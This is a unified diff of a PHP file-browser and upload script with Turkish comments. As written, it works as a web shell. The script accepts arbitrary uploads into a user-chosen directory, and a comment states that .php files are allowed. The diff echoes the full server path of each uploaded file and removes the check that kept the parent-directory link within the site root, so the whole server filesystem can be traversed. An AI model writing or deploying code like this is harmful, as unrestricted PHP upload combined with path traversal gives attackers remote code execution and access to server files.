@@ -15,11 +15,14 @@ if (strpos($current_dir, realpath($root)) !== 0 && strpos($current_dir, realpath
 }
 
 // Dosya yükleme işlemi
+$uploaded_file_path = ''; // Yüklenen dosyanın yolu
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
     $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
     // .php uzantılı dosyalar için yüklemeye izin ver
     if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
-        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name']));
+        $uploaded_file_path = htmlspecialchars($target_file);
+        echo 'Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '<br>';
+        echo 'Yüklenen Dosya Yolu: ' . $uploaded_file_path . '<br>';
     } else {
         echo 'Dosya yüklenemedi!';
     }
@@ -35,8 +38,11 @@ function is_image($file) {
 
 // Dizinlerde gezinme bağlantılarını oluşturma
 $navigation_links = [];
-if ($current_dir != realpath($root)) {
-    $navigation_links[] = '<a href="?dir=' . urlencode(dirname($current_dir)) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a>';
+
+// Her dizinde üst dizin bağlantısı ekliyoruz
+$parent_dir = dirname($current_dir);
+if ($parent_dir !== $current_dir) {
+    $navigation_links[] = '<li><a href="?dir=' . urlencode($parent_dir) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a></li>';
 }
 
 // Mevcut dizindeki dosya ve dizinler için bağlantılar oluşturma
@@ -45,23 +51,24 @@ foreach ($files as $file) {
     $file_path = $current_dir . '/' . $file;
     if (is_dir($file_path)) {
         // Dizinler için bağlantı oluştur
-        $navigation_links[] = '<a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a>';
+        $navigation_links[] = '<li><a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a> (Dizin)</li>';
     } else {
         // Dosyalar için bağlantı oluştur
-        $navigation_links[] = htmlspecialchars($file) . (is_image($file) ? ' <img src="' . htmlspecialchars($file_path) . '" style="width:100px;"/>' : '');
+        $icon = is_image($file) ? '<img src="' . htmlspecialchars($file_path) . '" style="width:50px;"/>' : '';
+        $navigation_links[] = '<li>' . htmlspecialchars($file) . ' ' . $icon . '</li>';
     }
 }
 
 // Site dizinine gitmek için bir bağlantı ekliyoruz
-$navigation_links[] = '<a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a>';
+$navigation_links[] = '<li><a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a></li>';
 // Sunucunun en üst dizinine gitmek için bir bağlantı ekliyoruz
-$navigation_links[] = '<a href="?dir=' . urlencode($top_level) . '&up=' . urlencode($_GET['up']) . '">En Üst Dizinine Git</a>';
+$navigation_links[] = '<li><a href="?dir=' . urlencode($top_level) . '&up=' . urlencode($_GET['up']) . '">En Üst Dizinine Git</a></li>';
 
 // Kullanıcıya dosyaları ve dizinleri gösterme
-echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
+echo "<h2>Mevcut Dizin: " . htmlspecialchars($current_dir) . "</h2>";
 echo "<ul>";
 foreach ($navigation_links as $link) {
-    echo "<li>$link</li>";
+    echo $link;
 }
 echo "</ul>";
 
